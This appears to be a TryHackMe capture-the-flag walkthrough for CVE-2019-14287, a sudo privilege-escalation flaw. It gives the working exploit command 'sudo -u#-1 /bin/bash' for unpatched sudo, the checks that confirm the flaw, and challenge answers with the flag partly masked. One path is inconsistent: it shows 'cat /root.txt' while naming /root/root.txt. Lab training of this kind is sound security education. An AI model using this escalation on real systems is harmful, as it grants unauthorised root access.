---
title: Sudo Security Bypass - TryHackMe
published: 2020-08-16
description: 'A step-by-step guide to identifying and exploiting CVE-2019-14287 in the Unix Sudo Program.'
image: './cover.jpg'
tags: [TryHackMe, CVE, Sudo, PrivEsc]
category: 'TryHackMe'
draft: false
---

## Introduction

This guide provides a detailed walkthrough for identifying and exploiting CVE-2019-14287, a privilege escalation vulnerability in the Unix Sudo program. This is Room One in the SudoVulns Series on TryHackMe, designed to teach security bypass techniques.

> **TryHackMe Room: Sudo Security Bypass**  
> A tutorial room exploring CVE-2019-14287 in the Unix Sudo Program. Room One in the SudoVulns Series.  
> [Visit Room](https://tryhackme.com/room/sudovulnsbypass?source=post_page-----c78cb21aa0cb---------------------------------------)

## Task 1: Deploy

To begin, deploy the TryHackMe machine and connect to it using SSH with the following command, replacing `<port-number>`, `<username>`, and `<remote-machine-ip>` with the values provided by TryHackMe:

```bash
ssh -p <port-number> <username>@<remote-machine-ip>
```

:::note
Ensure you have the correct credentials and port number from the TryHackMe room instructions.
:::

## Task 2: Security Bypass

### Checking for Vulnerability

To determine if the target machine is vulnerable to CVE-2019-14287, first check the sudo configuration by running:

```bash
sudo -l
```

**Expected Output**:
```
User <username> may run the following commands on <hostname>:
    (ALL, !root) /bin/bash
```

If the output includes `(ALL, !root) /bin/bash`, the machine may be vulnerable, as this configuration allows the user to run `/bin/bash` as any user except `root`—a restriction that CVE-2019-14287 can bypass.

![sudo -l output](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dkduYM7DGoO1UrI6wC7STg.png)
*Image: Output of `sudo -l` showing the vulnerable configuration `(ALL, !root) /bin/bash`.*

To confirm vulnerability, check the sudo version:

```bash
sudo --version
```

![sudo version check](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tljqQqVfF7IUSVvIk_FJFA.png)
*Image: Checking the sudo version to confirm vulnerability (Sudo < 1.8.28).*

If the version is **Sudo < 1.8.28** (e.g., 1.8.27 or earlier), the machine is vulnerable. This is because CVE-2019-14287 exploits a flaw in how sudo handles negative user IDs.

:::note
This vulnerability was patched in Sudo version 1.8.28, released in October 2019.
:::

### Exploiting the Vulnerability

CVE-2019-14287 allows a user to bypass the `(ALL, !root)` restriction by specifying an invalid user ID (`-u#-1`), which sudo interprets as the root user due to improper validation. To exploit this, run:

```bash
sudo -u#-1 /bin/bash
```

![security bypass exploit](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XxHCy_a432wtnCSVzlsVSQ.png)
*Image: Executing the exploit command `sudo -u#-1 /bin/bash` to gain a root shell.*

This command grants a root shell, as the `-u#-1` flag tricks sudo into running `/bin/bash` as the root user (UID 0).

### Capturing the Root Flag

With root access, navigate to the `/root` directory and read the `root.txt` file to retrieve the flag:

```bash
cd /root
cat /root.txt
```

![root flag](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SPWk07gIDobGn4ljOGAq8g.png)
*Image: Displaying the root flag from `/root/root.txt`.*

The flag will be in the format `THM{...}`.

## Challenges

**#1. What command are you allowed to run with sudo?**  
**Answer**: `/bin/bash`

**#2. What is the flag in /root/root.txt?**  
**Answer**: `THM{l33t_********_******}`

## Conclusion

Congratulations! You’ve successfully identified and exploited CVE-2019-14287 to bypass sudo’s security restrictions and capture the root flag. This exercise demonstrates the importance of keeping software up to date to mitigate known vulnerabilities.


